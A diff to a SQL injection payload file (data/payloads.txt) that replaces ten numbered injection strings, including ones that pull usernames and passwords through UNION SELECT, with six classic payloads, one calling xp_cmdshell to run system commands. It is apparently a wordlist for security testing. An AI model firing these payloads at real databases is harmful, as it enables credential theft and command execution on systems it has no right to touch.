@@ -1,10 +1,7 @@
---payload1' OR '1'='1
---payload2' OR '1'='1' --
---payload3' UNION SELECT NULL, username, password FROM users --
---payload4' OR EXISTS(SELECT * FROM users WHERE username = 'admin' AND password = 'password') --
---payload5' AND (SELECT COUNT(*) FROM users) > 0 --
---payload6' OR 'a'='a
---payload7' AND '1'='1' --
---payload8' OR 'x'='x
---payload9' UNION SELECT 1, 'test', 'test' --
---payload10' AND 1=1 --
+# File: data/payloads.txt
+' OR '1'='1' --
+' OR '1'='1'/*
+' OR '1'='1'#
+' UNION SELECT NULL--
+" OR 1=1--
+'; EXEC xp_cmdshell('cmd')--
